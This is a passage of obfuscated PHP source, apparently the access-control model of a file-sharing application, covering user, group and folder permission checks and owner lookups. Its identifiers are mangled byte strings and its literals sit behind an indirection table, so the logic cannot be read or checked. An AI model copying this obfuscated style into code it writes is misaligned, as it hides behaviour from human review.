$ÈïÆ˜Íı[$©‹É¤Ğ·[32]], $©‹É¤Ğ·[203] => $ÈïÆ˜Íı[$©‹É¤Ğ·[100]][$©‹É¤Ğ·[203]], $©‹É¤Ğ·[97] => KodIO::make($ÈïÆ˜Íı[$©‹É¤Ğ·[100]][$©‹É¤Ğ·[203]]), $©‹É¤Ğ·[202] => $©‹É¤Ğ·[238], $©‹É¤Ğ·[200] => $©‹É¤Ğ·[571], $©‹É¤Ğ·[33] => $©‹É¤Ğ·[609], $©‹É¤Ğ·[575] => $ÈïÆ˜Íı[$©‹É¤Ğ·[582]], $©‹É¤Ğ·[1959] => $ÈïÆ˜Íı[$©‹É¤Ğ·[1959]], $©‹É¤Ğ·[579] => $ÈïÆ˜Íı[$©‹É¤Ğ·[202]], $©‹É¤Ğ·[2147] => array($ŠÀáãˆƒ)); $„ Öòìæ[$Ï¬Ğ¡ê—[$©‹É¤Ğ·[203]]] = $Ï¬Ğ¡ê—; } } $¸£îµ¿ = array(); $ËØ³Ô°¼ = $this->getAllChildren($ı¸‡¦); foreach ($ËØ³Ô°¼ as $ı¤¯Ù) { $¸Ëû‹•œ = !1; foreach ($ı¤¯Ù[$©‹É¤Ğ·[2147]] as $³ÂŒÔÓˆ) { if ($³ÂŒÔÓˆ[$©‹É¤Ğ·[1761]]) { if ($³ÂŒÔÓˆ[$©‹É¤Ğ·[1761]] == $Öö¦Êâ) { $¸Ëû‹•œ = !0; break; } } if ($³ÂŒÔÓˆ[$©‹É¤Ğ·[1959]]) { if ($this->groupContainUser($³ÂŒÔÓˆ[$©‹É¤Ğ·[1959]], $Öö¦Êâ)) { $¸Ëû‹•œ = !0; break; } } } if ($¸Ëû‹•œ) { $¸£îµ¿[] = $ı¤¯Ù; } $Ä¾ş•£Á = $ı¤¯Ù[$©‹É¤Ğ·[203]]; if (isset($„ Öòìæ[$Ä¾ş•£Á])) { $ı¤¯Ù[$©‹É¤Ğ·[2147]][] = $„ Öòìæ[$Ä¾ş•£Á][0]; $„ Öòìæ[$Ä¾ş•£Á] = !1; } } $„ Öòìæ = array_filter(array_values($„ Öòìæ)); $¸£îµ¿ = array_merge($„ Öòìæ, $¸£îµ¿); return $¸£îµ¿; } public function setAllChildrenByUser($ìÍÆç…Ù, $§®­˜Ü‘, $©©äŞ–) { $‚àŞÂ =& $_SERVER[è¶³ÒßÑ]; $ÍŞ³ù¿î = $this->getAllChildrenByUser($ìÍÆç…Ù, $§®­˜Ü‘); if (!$©©äŞ– || !$ÍŞ³ù¿î) { return !1; } foreach ($ÍŞ³ù¿î as $Ú‘³ı¡÷) { $¼ÆŒø½€ = array(); foreach ($Ú‘³ı¡÷[$‚àŞÂ[2147]] as $¨Ğ×ÆÊ¡) { $¿Ùá‡Õ½ = $¨Ğ×ÆÊ¡[$‚àŞÂ[533]]; $ïßˆÔÑ« = $¨Ğ×ÆÊ¡[$‚àŞÂ[1761]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $²¸¤£ë = $¨Ğ×ÆÊ¡[$‚àŞÂ[1761]] ? $¨Ğ×ÆÊ¡[$‚àŞÂ[1761]] : $¨Ğ×ÆÊ¡[$‚àŞÂ[1959]]; if ($¨Ğ×ÆÊ¡[$‚àŞÂ[1761]] && $¨Ğ×ÆÊ¡[$‚àŞÂ[1761]] == $§®­˜Ü‘) { continue; } $¼ÆŒø½€[] = array($‚àŞÂ[203] => $Ú‘³ı¡÷[$‚àŞÂ[203]], $‚àŞÂ[200] => $ïßˆÔÑ«, $‚àŞÂ[562] => intval($²¸¤£ë), $‚àŞÂ[2067] => isset($¿Ùá‡Õ½[$‚àŞÂ[468]]) ? intval($¿Ùá‡Õ½[$‚àŞÂ[468]]) : 0, $‚àŞÂ[2127] => isset($¿Ùá‡Õ½[$‚àŞÂ[2127]]) ? intval($¿Ùá‡Õ½[$‚àŞÂ[2127]]) : -1); } $¼ÆŒø½€[] = array($‚àŞÂ[203] => $Ú‘³ı¡÷[$‚àŞÂ[203]], $‚àŞÂ[200] => SourceModel::TYPE_USER, $‚àŞÂ[562] => intval($§®­˜Ü‘), $‚àŞÂ[2067] => intval($©©äŞ–), $‚àŞÂ[2127] => -1); $this->where(array($‚àŞÂ[484] => $Ú‘³ı¡÷[$‚àŞÂ[203]]))->delete(); $this->addAll($¼ÆŒø½€); } return !0; } public function get($‘›œß— ) { $é®œ­æİ = $this->getSourceList(array($‘›œß— ), !0); return $é®œ­æİ[0]; } public function getSourceList($£ïÖäöÛ, $©ÑÅÃ¼ = false, $¼ïİ¿Ö = false) { $ö³Ó¿²ó =& $_SERVER[è¶³ÒßÑ]; if (!$£ïÖäöÛ) { return array(); } $á©Ğ‚çŠ = Model($ö³Ó¿²ó[1395]); if (!$©ÑÅÃ¼ && count($£ïÖäöÛ) == 1) { $©ÑÅÃ¼ = array(); $©ÑÅÃ¼[$£ïÖäöÛ[0]] = $á©Ğ‚çŠ->sourceInfo($£ïÖäöÛ[0]); } if (!$©ÑÅÃ¼) { $Ì‹ğ¶Şê = array($ö³Ó¿²ó[484] => array($ö³Ó¿²ó[485], $£ïÖäöÛ)); $©ÑÅÃ¼ = $á©Ğ‚çŠ->field($ö³Ó¿²ó[2151])->where($Ì‹ğ¶Şê)->select(); $©ÑÅÃ¼ = array_to_keyvalue($©ÑÅÃ¼, $ö³Ó¿²ó[203]); } $í‘úôó = $£ïÖäöÛ; foreach ($©ÑÅÃ¼ as $Ï÷Â›‚ƒ => $£‘¸È) { $œ¦ÆÙ¼ó = $á©Ğ‚çŠ->parentLevelArray($£‘¸È[$ö³Ó¿²ó[577]]); $í‘úôó = array_merge($í‘úôó, array($Ï÷Â›‚ƒ), array_reverse($œ¦ÆÙ¼ó)); } $í‘úôó = array_values(array_unique($í‘úôó)); if (!$í‘úôó) { return array(); } $²œÆšÇ© = $this->sourceAuthSelect($í‘úôó); $†¼«É¨É = array(); foreach ($í‘úôó as $”ƒ‰Äô¤) { if (isset($²œÆšÇ©[$”ƒ‰Äô¤])) { $†¼«É¨É[$”ƒ‰Äô¤] = $²œÆšÇ©[$”ƒ‰Äô¤]; } } $¡îÇ¶Ñ = $this->userIsRoot($¼ïİ¿Ö); $ÃÆáëšÕ = AuthModel::authAll(); $°ËôÜÏÄ = array($ö³Ó¿²ó[481] => $ÃÆáëšÕ, $ö³Ó¿²ó[2152] => array($ö³Ó¿²ó[486] => 0, $ö³Ó¿²ó[1965] => $ÃÆáëšÕ, $ö³Ó¿²ó[487] => LNG($ö³Ó¿²ó[2153]), $ö³Ó¿²ó[1982] => $ö³Ó¿²ó[2154])); $õÌ­Û†Ú = array(); foreach ($©ÑÅÃ¼ as $”ƒ‰Äô¤ => $ä¡Î²›ä) { if ($¡îÇ¶Ñ && $GLOBALS[$ö³Ó¿²ó[6]][$ö³Ó¿²ó[1978]]) { $õÌ­Û†Ú[$”ƒ‰Äô¤] = $°ËôÜÏÄ; continue; } $õÌ­Û†Ú[$”ƒ‰Äô¤] = $this->makeSourceAuth($ä¡Î²›ä, $†¼«É¨É, $¼ïİ¿Ö); } return $õÌ­Û†Ú; } public function authDeepCheck($‹´›æôì, $µÌÊÑ÷Á = false) { $Ò„Ÿšò´ =& $_SERVER[è¶³ÒßÑ]; $µÌÊÑ÷Á = $µÌÊÑ÷Á ? $µÌÊÑ÷Á : USER_ID; $®‘Ç™€İ = $this->makeAuthDeep($µÌÊÑ÷Á); if (!in_array($‹´›æôì, $®‘Ç™€İ[$Ò„Ÿšò´[2155]])) { return !1; } $¿ªåÙ— = array(); foreach ($®‘Ç™€İ[$Ò„Ÿšò´[2156]] as $²Œ¼¸Ù¢ => $è¾ü¿æØ) { if (!in_array($‹´›æôì, $è¾ü¿æØ)) { continue; } $¿ªåÙ—[] = $²Œ¼¸Ù¢; } if (!$¿ªåÙ—) { return !1; } $ Ú—áÓÍ = $¿ªåÙ— ? $¿ªåÙ—[0] : $‹´›æôì; return array($Ò„Ÿšò´[481] => -1, $Ò„Ÿšò´[533] => array($Ò„Ÿšò´[486] => $Ò„Ÿšò´[1248], $Ò„Ÿšò´[1965] => $Ò„Ÿšò´[238], $Ò„Ÿšò´[487] => LNG($Ò„Ÿšò´[2157]), $Ò„Ÿšò´[1982] => $Ò„Ÿšò´[2158]), $Ò„Ÿšò´[2159] => LNG($Ò„Ÿšò´[2160]), $Ò„Ÿšò´[2161] => $this->sourceAuthInfo($ Ú—áÓÍ)); } protected function makeAuthDeep($©üÌû° = false) { $Çµò½÷‹ =& $_SERVER[è¶³ÒßÑ]; static $ùÑŒÍ„¡ = array(); $©üÌû° = $©üÌû° ? $©üÌû° : USER_ID; if (isset($ùÑŒÍ„¡[$©üÌû°])) { return $ùÑŒÍ„¡[$©üÌû°]; } $—ò©Œì™ = Model($Çµò½÷‹[2162])->listData(); $ìèœğÉÑ = array(); foreach ($—ò©Œì™ as $¥±…ı÷é) { if ($¥±…ı÷é[$Çµò½÷‹[480]] == 0 && $¥±…ı÷é[$Çµò½÷‹[1981]] == $Çµò½÷‹[101]) { $ìèœğÉÑ[] = $¥±…ı÷é[$Çµò½÷‹[468]]; } } $ş¿ºìÙ = $this->userGroupParents($©üÌû°); $˜çƒ âİ = array($Çµò½÷‹[200] => SourceModel::TYPE_USER, $Çµò½÷‹[562] => $©üÌû°); if ($ş¿ºìÙ) { $˜çƒ âİ = array(array($Çµò½÷‹[200] => SourceModel::TYPE_USER, $Çµò½÷‹[562] => $©üÌû°), array($Çµò½÷‹[200] => SourceModel::TYPE_GROUP, $Çµò½÷‹[562] => array($Çµò½÷‹[485], $ş¿ºìÙ)), $Çµò½÷‹[1053] => $Çµò½÷‹[2061]); } $™ë¯‘µÔ = $this->field($Çµò½÷‹[2163])->where($˜çƒ âİ)->select(); $ğÚáªÅõ = array(); $€ü¤ğò = array_to_keyvalue_group($™ë¯‘µÔ, $Çµò½÷‹[203]); foreach ($€ü¤ğò as $„ú¨õ•İ => $­ú…¯¥İ) { $ı«¯Óô½ = $this->authArrayCheck($­ú…¯¥İ, $©üÌû°); if ($ı«¯Óô½[$Çµò½÷‹[481]] > 0) { $ğÚáªÅõ[] = $„ú¨õ•İ . $Çµò½÷‹[12]; } } if ($ş¿ºìÙ) { $Ã®œìÍè = Model($Çµò½÷‹[578]); foreach ($ş¿ºìÙ as $Šûå·´—) { $”ÛåüÊ” = $Ã®œìÍè->getInfo($Šûå·´—); if (!$”ÛåüÊ” || !is_array($”ÛåüÊ”[$Çµò½÷‹[100]])) { continue; } $ğÚáªÅõ[] = $”ÛåüÊ”[$Çµò½÷‹[100]][$Çµò½÷‹[203]]; } } $‰Èµ·ôı = array(); $Ü„®è‹â = $ş¿ºìÙ; $Æ—äù¹’ = Model($Çµò½÷‹[1395]); $Ã®œìÍè = Model($Çµò½÷‹[578]); $š‡ÈŸŸ¥ = array(); $°°ş× = array(); $ù€‰µëá = array(); $Î¶ØÅı´ = array(); if ($ğÚáªÅõ) { $æ™õ¤ƒ = $Æ—äù¹’->where(array($Çµò½÷‹[203] => array($Çµò½÷‹[485], $ğÚáªÅõ)))->select(); foreach ($æ™õ¤ƒ as $İä»¡ùˆ) { $áĞ´à¶´ = $Æ—äù¹’->parentLevelArray($İä»¡ùˆ[$Çµò½÷‹[577]]); $‰Èµ·ôı = array_merge($‰Èµ·ôı, $áĞ´à¶´); $Ü„®è‹â[] = $İä»¡ùˆ[$Çµò½÷‹[562]]; $š‡ÈŸŸ¥[$İä»¡ùˆ[$Çµò½÷‹[203]]] = $áĞ´à¶´; $°°ş×[$İä»¡ùˆ[$Çµò½÷‹[203]]] = $İä»¡ùˆ[$Çµò½÷‹[562]]; } } $Ü„®è‹â = array_values(array_unique($Ü„®è‹â)); $ô›ÖÒæ = $Ü„®è‹â; foreach ($ô›ÖÒæ as $Šûå·´—) { $”ÛåüÊ” = $Ã®œìÍè->getInfo($Šûå·´—); $áĞ´à¶´ = $Æ—äù¹’->parentLevelArray($”ÛåüÊ”[$Çµò½÷‹[577]]); $Ü„®è‹â = array_merge($Ü„®è‹â, $áĞ´à¶´); } $Ü„®è‹â = array_values(array_unique($Ü„®è‹â)); foreach ($Ü„®è‹â as $Šûå·´—) { $”ÛåüÊ” = $Ã®œìÍè->getInfo($Šûå·´—); $‰Èµ·ôı[] = $”ÛåüÊ”[$Çµò½÷‹[100]][$Çµò½÷‹[203]]; $ù€‰µëá[$Šûå·´—] = $”ÛåüÊ”[$Çµò½÷‹[100]][$Çµò½÷‹[203]]; $Î¶ØÅı´[$Šûå·´—] = $Æ—äù¹’->parentLevelArray($”ÛåüÊ”[$Çµò½÷‹[577]]); } foreach ($š‡ÈŸŸ¥ as $ñ²Í×ÎÁ => $ìõÀÜŞ†) { $²­‚±Äû = $°°ş×[$ñ²Í×ÎÁ]; if (!$²­‚±Äû || !$ù€‰µëá[$²­‚±Äû]) { continue; } $ã±¡Íô‡ = array(); foreach ($Î¶ØÅı´[$²­‚±Äû] as $Šûå·´—) { $ã±¡Íô‡[] = $ù€‰µëá[$Šûå·´—]; } $š‡ÈŸŸ¥[$ñ²Í×ÎÁ] = array_merge($ã±¡Íô‡, $ìõÀÜŞ†); } $‰Èµ·ôı = array_values(array_unique($‰Èµ·ôı)); $…‚›ª = array($Çµò½÷‹[2155] => $‰Èµ·ôı, $Çµò½÷‹[2156] => $š‡ÈŸŸ¥); $ùÑŒÍ„¡[$©üÌû°] = $…‚›ª; return $…‚›ª; } private function makeSourceAuth($¸—Ç”°, $ß‹Ìô×¬, $îŒÌ‡·À = false) { $õ°Ô¥• =& $_SERVER[è¶³ÒßÑ]; $ğøáØù = $õ°Ô¥•[101]; $€¾¿ĞŠ³ = $¸—Ç”°[$õ°Ô¥•[562]]; $ú… ³Ü = $¸—Ç”°[$õ°Ô¥•[200]] == SourceModel::TYPE_GROUP; $¼ Ö´³Ü = $ú… ³Ü ? $this->groupRootAuth($€¾¿ĞŠ³, $îŒÌ‡·À) : !1; if ($¼ Ö´³Ü && Model($õ°Ô¥•[564])->authCheckAction($¼ Ö´³Ü[$õ°Ô¥•[480]], $õ°Ô¥•[1980])) { return $this->groupAuthInfo($¼ Ö´³Ü, $€¾¿ĞŠ³); } $ìŒĞÍŠÁ = Model($õ°Ô¥•[1395])->parentLevelArray($¸—Ç”°[$õ°Ô¥•[577]]); $ìŒĞÍŠÁ = array_merge(array($¸—Ç”°[$õ°Ô¥•[203]]), array_reverse($ìŒĞÍŠÁ)); $ãÚ’›¦ = !1; foreach ($ìŒĞÍŠÁ as $Ô˜ ï…Å) { if (!isset($ß‹Ìô×¬[$Ô˜ ï…Å])) { continue; } $…ÑÄ¶ = $this->authMake($ß‹Ìô×¬[$Ô˜ ï…Å], $îŒÌ‡·À); if ($…ÑÄ¶[$õ°Ô¥•[533]]) { $ãÚ’›¦ = $…ÑÄ¶; break; } } if (!$ú… ³Ü) { return $ãÚ’›¦; } if (!$ãÚ’›¦ && $¼ Ö´³Ü) { $ãÚ’›¦ = $this->groupAuthInfo($¼ Ö´³Ü, $€¾¿ĞŠ³); } if (!$ãÚ’›¦) { $Ğôªù½© = Model($õ°Ô¥•[578])->getInfo($€¾¿ĞŠ³); $¿ éÉÅ‡ = explode($õ°Ô¥•[50], trim($Ğôªù½©[$õ°Ô¥•[577]], $õ°Ô¥•[50])); $¿ éÉÅ‡ = array_reverse($¿ éÉÅ‡); foreach ($¿ éÉÅ‡ as $¼İ¶ìÓ“) { if ($¼İ¶ìÓ“ == $õ°Ô¥•[238] || $¼İ¶ìÓ“ == $ğøáØù) { continue; } $ ÔÁîôÓ = $this->groupRootAuth($¼İ¶ìÓ“, $îŒÌ‡·À); if (!$ ÔÁîôÓ) { continue; } $ãÚ’›¦ = $this->groupAuthInfo($ ÔÁîôÓ, $¼İ¶ìÓ“); break; } } if (!$ãÚ’›¦ || $ãÚ’›¦[$õ°Ô¥•[481]] <= 0) { $¿÷Õ»¶ = $this->authDeepCheck($¸—Ç”°[$õ°Ô¥•[203]], $îŒÌ‡·À); if ($¿÷Õ»¶) { $ãÚ’›¦ = $¿÷Õ»¶; } } return $ãÚ’›¦; } private function userIsRoot($˜ãıÆ‘ª = false) { $øŠéû§® =& $_SERVER[è¶³ÒßÑ]; if (!$˜ãıÆ‘ª && KodUser::isRoot()) { return !0; } $òêû˜ = Model($øŠéû§®[591])->getInfo($˜ãıÆ‘ª); $æœæİ·§ = Model($øŠéû§®[2164])->listData($òêû˜[$øŠéû§®[2165]]); if ($æœæİ·§ && $æœæİ·§[$øŠéû§®[568]][$øŠéû§®[2166]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Ü…¶€î) { $ºÊÒéŸ =& $_SERVER[è¶³ÒßÑ]; $òÏÄÉŠ = Model($ºÊÒéŸ[1395]); $¹Õİšî = $òÏÄÉŠ->sourceInfo($Ü…¶€î); if (!$¹Õİšî) { return !1; } $òÏÄÉŠ->groupPathDisplay($¹Õİšî); $ÉË¿‰¾’ = array($¹Õİšî); $ÉË¿‰¾’ = $òÏÄÉŠ->_listAppendPath($ÉË¿‰¾’); $¹Õİšî = $ÉË¿‰¾’[0]; $”ø¤û–à = $¹Õİšî[$ºÊÒéŸ[575]]; if (isset($¹Õİšî[$ºÊÒéŸ[583]])) { $ÊÒ¼æª = explode($ºÊÒéŸ[8], trim($¹Õİšî[$ºÊÒéŸ[575]], $ºÊÒéŸ[8])); array_shift($ÊÒ¼æª); $”ø¤û–à = $¹Õİšî[$ºÊÒéŸ[581]] . $ºÊÒéŸ[2167] . implode($ºÊÒéŸ[8], $ÊÒ¼æª); } return array($ºÊÒéŸ[487] => $¹Õİšî[$ºÊÒéŸ[32]], $ºÊÒéŸ[97] => KodIO::make($¹Õİšî[$ºÊÒéŸ[203]]), $ºÊÒéŸ[2168] => $”ø¤û–à); } private function groupAuthInfo($š©¯ñË°, $ÒşşÁ£š) { $îÇÎ°’µ =& $_SERVER[è¶³ÒßÑ]; $‘¨Ôå¸§ = Model($îÇÎ°’µ[578])->getInfo($ÒşşÁ£š); return array($îÇÎ°’µ[2169] => intval($š©¯ñË°[$îÇÎ°’µ[480]]), $îÇÎ°’µ[2152] => $š©¯ñË°, $îÇÎ°’µ[2170] => LNG($îÇÎ°’µ[2171]), $îÇÎ°’µ[2161] => array($îÇÎ°’µ[487] => $‘¨Ôå¸§[$îÇÎ°’µ[32]], $îÇÎ°’µ[97] => KodIO::make($‘¨Ôå¸§[$îÇÎ°’µ[100]][$îÇÎ°’µ[203]]), $îÇÎ°’µ[2168] => $‘¨Ôå¸§[$îÇÎ°’µ[582]])); } protected function groupRootAuth($‚Ê™¸ÕÎ, $øÌîÆ˜è = false) { $Çèäúæ® =& $_SERVER[è¶³ÒßÑ]; $øÌîÆ˜è = $øÌîÆ˜è ? $øÌîÆ˜è : USER_ID; $‡Ø“¡§‡ = $øÌîÆ˜è . $Çèäúæ®[2172] . $‚Ê™¸ÕÎ; static $öİÆí ö = array(); if (isset($öİÆí ö[$‡Ø“¡§‡])) { return $öİÆí ö[$‡Ø“¡§‡]; } $ş¹Ìòø… = Model($Çèäúæ®[578])->getInfo($‚Ê™¸ÕÎ); $ãÀÀ¹ÆÊ = $this->userGroupList($øÌîÆ˜è); $º–îûæÜ = isset($ãÀÀ¹ÆÊ[$‚Ê™¸ÕÎ]) ? $ãÀÀ¹ÆÊ[$‚Ê™¸ÕÎ][$Çèäúæ®[480]] : !1; if ($º–îûæÜ && Model($Çèäúæ®[564])->authCheckAction($º–îûæÜ[$Çèäúæ®[480]], $Çèäúæ®[1980])) { $öİÆí ö[$‡Ø“¡§‡] = $º–îûæÜ; return $º–îûæÜ; } $®‚µ¨§õ = $this->sourceAuthSelect($ş¹Ìòø…[$Çèäúæ®[100]][$Çèäúæ®[203]]); $´¥î¬¹ü = $®‚µ¨§õ ? $this->authMake($®‚µ¨§õ, $øÌîÆ˜è) : !1; $Á¤øéŞ¡ = $´¥î¬¹ü ? $´¥î¬¹ü[$Çèäúæ®[533]] : !1; $öİÆí ö[$‡Ø“¡§‡] = $Á¤øéŞ¡ ? $Á¤øéŞ¡ : $º–îûæÜ; return $öİÆí ö[$‡Ø“¡§‡]; } public function authOwnerApply($£²îó­º) { $ç¹Ó·ñş =& $_SERVER[è¶³ÒßÑ]; if (empty($£²îó­º[$ç¹Ó·ñş[480]]) || isset($£²îó­º[$ç¹Ó·ñş[2173]]) && $£²îó­º[$ç¹Ó·ñş[2173]]) { return $£²îó­º; } if (AuthModel::authCheckRoot($£²îó­º[$ç¹Ó·ñş[480]][$ç¹Ó·ñş[481]])) { return $£²îó­º; } $Ş†ĞğÕ = Model($ç¹Ó·ñş[1395])->parentLevelArray($£²îó­º[$ç¹Ó·ñş[577]]); $Ş†ĞğÕ = array_merge(array($£²îó­º[$ç¹Ó·ñş[203]]), array_reverse($Ş†ĞğÕ)); $î¬à¤Í¦ = $this->sourceAuthSelect($Ş†ĞğÕ); $†ÔÍ¯«± = array(); $õ½–¥Á’ = array(); foreach ($î¬à¤Í¦ as $¼Î»Òà => $ç‚›²ŸÕ) { $ä’­ÚŒç = $this->authFolderOwnerUser($ç‚›²ŸÕ); $†ÔÍ¯«±[$¼Î»Òà] = $ä’­ÚŒç; $õ½–¥Á’ = array_merge($õ½–¥Á’, $ä’­ÚŒç[$ç¹Ó·ñş[655]]); if ($ä’­ÚŒç[$ç¹Ó·ñş[2174]]) { break; } } if (count($õ½–¥Á’) == 0) { $õ½–¥Á’ = $this->authFolderOwnerGroup($£²îó­º[$ç¹Ó·ñş[562]]); } $õ½–¥Á’ = array_unique($õ½–¥Á’); if (AuthModel::authCheckRoot($£²îó­º[$ç¹Ó·ñş[480]][$ç¹Ó·ñş[481]])) { $õ½–¥Á’[] = USER_ID; } $£²îó­º[$ç¹Ó·ñş[480]][$ç¹Ó·ñş[2175]] = Model($ç¹Ó·ñş[570])->userListInfo($õ½–¥Á’); return $£²îó­º; } private function authFolderOwnerGroup($ˆêô‘¬ƒ) { $ŒÒ¹Üø“ =& $_SERVER[è¶³ÒßÑ]; $ŒÀÜÃ¦ = Model($ŒÒ¹Üø“[2053])->where(array($ŒÒ¹Üø“[1959] => $ˆêô‘¬ƒ))->select(); $•ô…Ú¹ = array(); if (!$ŒÀÜÃ¦) { return $•ô…Ú¹; } foreach ($ŒÀÜÃ¦ as $Ï¶¸‡¶) { $ç¶©š¢Å = $this->authInfo($Ï¶¸‡¶); if (AuthModel::authCheckRoot($ç¶©š¢Å[$ŒÒ¹Üø“[480]])) { $•ô…Ú¹[] = $Ï¶¸‡¶[$ŒÒ¹Üø“[1761]]; } } return $•ô…Ú¹; } private function authFolderOwnerUser($ùÆ‘öÆã) { $ëèÅƒÈ =& $_SERVER[è¶³ÒßÑ]; $¡ ïµô„ = array(); $Üô°á»º = !1; foreach ($ùÆ‘öÆã as $ŒÅ˜½Û¯) { $£½î¼Å¤ = $this->authInfo($ŒÅ˜½Û¯); if ($ŒÅ˜½Û¯[$ëèÅƒÈ[562]] == $ëèÅƒÈ[238]) { $Üô°á»º = !0; } if ($ŒÅ˜½Û¯[$ëèÅƒÈ[200]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($£½î¼Å¤[$ëèÅƒÈ[480]])) { $¡ ïµô„[] = $ŒÅ˜½Û¯[$ëèÅƒÈ[562]]; } } } return array($ëèÅƒÈ[655] => $¡ ïµô„, $ëèÅƒÈ[2174] => $Üô°á»º); } public function authMake($Ñ¾¤ÉĞ×, $¦¯òÓ¼ = false) { $¨›ÔíÛŒ =& $_SERVER[è¶³ÒßÑ]; $¬åµ®šÃ = $this->authArrayCheck($Ñ¾¤ÉĞ×, $¦¯òÓ¼); if ($¬åµ®šÃ[$¨›ÔíÛŒ[2176]]) { $¬åµ®šÃ[$¨›ÔíÛŒ[2176]] = $this->sourceAuthInfo($¬åµ®šÃ[$¨›ÔíÛŒ[2176]]); } return $¬åµ®šÃ; } public function authArrayCheck($·İ£ª‚Ì, $ÖçÓ© = false) { $ù÷„ÀîÕ =& $_SERVER[è¶³ÒßÑ]; if (!$·İ£ª‚Ì) { return array($ù÷„ÀîÕ[481] => 0, $ù÷„ÀîÕ[533] => !1); } $ÖçÓ© = $ÖçÓ© ? $ÖçÓ© : USER_ID; $÷ÉÔŞû¦ = 0; $¢«‹Ø¿ = 0; $Öä¸•å = 0; $çãÛ— = 0; $ùıåÛá£ = 0; $‹£Ö³‡ = 0; $¦ºÕ¡¯› = 1000; $“±ãÇªç = 0; $é¢œÕ = 0; $ßÂÈÓº´ = 0; $ƒ™×­Æ = 0; $ú‰€© å = array($ù÷„ÀîÕ[203] => 0); foreach ($·İ£ª‚Ì as $ú‰€© å) { $äè®™á¹ = $this->authInfo($ú‰€© å); if (!$äè®™á¹) { continue; } $çĞí‘˜¦ = $ú‰€© å[$ù÷„ÀîÕ[562]]; $à‘ïùÄ‘ = intval($äè®™á¹[$ù÷„ÀîÕ[480]]); if ($ú‰€© å[$ù÷„ÀîÕ[200]] == SourceModel::TYPE_USER && $çĞí‘˜¦ == $ÖçÓ©) { $÷ÉÔŞû¦ = !0; $Öä¸•å = $äè®™á¹; $¢«‹Ø¿ = $à‘ïùÄ‘; } else { if ($ú‰€© å[$ù÷„ÀîÕ[200]] == SourceModel::TYPE_GROUP && $this->groupContainUser($çĞí‘˜¦, $ÖçÓ©)) { $çãÛ— = !0; $Ã˜›ºı­ = $this->groupStepToUserGroup($çĞí‘˜¦, $ÖçÓ©); if ($Ã˜›ºı­ < $¦ºÕ¡¯›) { $¦ºÕ¡¯› = $Ã˜›ºı­; $ùıåÛá£ = $à‘ïùÄ‘; $‹£Ö³‡ = $äè®™á¹; $“±ãÇªç = $çĞí‘˜¦; } if ($Ã˜›ºı­ == $¦ºÕ¡¯› && $à‘ïùÄ‘ >= $ùıåÛá£) { $ùıåÛá£ = $à‘ïùÄ‘; $‹£Ö³‡ = $äè®™á¹; $“±ãÇªç = $çĞí‘˜¦; } } else { if ($çĞí‘˜¦ == $ù÷„ÀîÕ[238]) { $é¢œÕ = !0; $ƒ™×­Æ = $äè®™á¹; $ßÂÈÓº´ = $à‘ïùÄ‘; } } } } if ($÷ÉÔŞû¦) { $¥ç÷–ú÷ = $¢«‹Ø¿; $äè®™á¹ = $Öä¸•å; $³˜²« = LNG($ù÷„ÀîÕ[2177]); } else { if ($çãÛ—) { $¥ç÷–ú÷ = $ùıåÛá£; $äè®™á¹ = $‹£Ö³‡; $°úîø­† = Model($ù÷„ÀîÕ[578])->getInfo($“±ãÇªç); $³˜²« = $ù÷„ÀîÕ[186] . $°úîø­†[$ù÷„ÀîÕ[582]] . $ù÷„ÀîÕ[2178] . LNG($ù÷„ÀîÕ[2179]); } else { if ($é¢œÕ) { $¥ç÷–ú÷ = $ßÂÈÓº´; $äè®™á¹ = $ƒ™×­Æ; $³˜²« = LNG($ù÷„ÀîÕ[2149]); } else { $¥ç÷–ú÷ = 0; $äè®™á¹ = !1; $³˜²« = $ù÷„ÀîÕ[12]; } } } $˜ÌĞ§¼ = array($ù÷„ÀîÕ[2169] => intval($¥ç÷–ú÷), $ù÷„ÀîÕ[2152] => $äè®™á¹, $ù÷„ÀîÕ[2170] => $³˜²«, $ù÷„ÀîÕ[2161] => $ú‰€© å[$ù÷„ÀîÕ[203]]); return $˜ÌĞ§¼; } private function groupContainUser($°Ü ÑŒ‚, $„õ¿ËÍ‘ = false) { return in_array($°Ü ÑŒ‚, $this->userGroupParents($„õ¿ËÍ‘)); } private function groupStepToUserGroup($ŞÏİ–ùÎ, $ëàÓ¾È¤ = false) { $°É¢á”ë =& $_SERVER[è¶³ÒßÑ]; $±óÛ…› = $this->userGroupList($ëàÓ¾È¤); $¿ÇÌşÓè = 1000; $İ Ë¨â = $GLOBALS[$°É¢á”ë[6]][$°É¢á”ë[102]][$°É¢á”ë[2066]] == 1; $„ÅğŞëÎ = $İ Ë¨â ? 3 : 2; foreach ($±óÛ…› as $È¦ï¿ÅŠ) { if ($È¦ï¿ÅŠ[$°É¢á”ë[1959]] == $ŞÏİ–ùÎ) { return 0; } $¾ÄÂ­Â± = explode($°É¢á”ë[50], trim($È¦ï¿ÅŠ[$°É¢á”ë[577]], $°É¢á”ë[50])); if ($¾ÄÂ­Â±[0] == $°É¢á”ë[238] && count($¾ÄÂ­Â±) > $„ÅğŞëÎ) { $øàØ´çÌ = array_reverse(array_slice($¾ÄÂ­Â±, $„ÅğŞëÎ)); $Øâä±ô = array_search($ŞÏİ–ùÎ, $øàØ´çÌ); if ($Øâä±ô !== !1 && $Øâä±ô + 1 <= $¿ÇÌşÓè) { $¿ÇÌşÓè = $Øâä±ô + 1; } } } return $¿ÇÌşÓè; } private function userGroupList($‰åÆØè = false) { $ô üæøı =& $_SERVER[è¶³ÒßÑ]; static $ÑäÆì¹å = array(); if (isset($ÑäÆì¹å[$‰åÆØè])) { return $ÑäÆì¹å[$‰åÆØè]; } $ÔÈé´Ó = Model($ô üæøı[591])->getInfo($‰åÆØè); $ÑäÆì¹å[$‰åÆØè] = array_to_keyvalue($ÔÈé´Ó[$ô üæøı[2150]], $ô üæøı[1959]); return $ÑäÆì¹å[$‰åÆØè]; } public function userGroupParents($íÈãôªò) { $Àˆ½ã¶ =& $_SERVER[è¶³ÒßÑ]; static $Äá—µîˆ = array(); $íÈãôªò = $íÈãôªò ? $íÈãôªò : USER_ID; if (isset($Äá—µîˆ[$íÈãôªò])) { return $Äá—µîˆ[$íÈãôªò]; } $“×Ø‹®‘ = $this->userGroupList($íÈãôªò); $‹ÙÙÔç = array(); $‡ËŠøÆı = $GLOBALS[$Àˆ½ã¶[6]][$Àˆ½ã¶[102]][$Àˆ½ã¶[2066]] == 1; $¿šÊ © = $‡ËŠøÆı ? 3 : 2; foreach ($“×Ø‹®‘ as 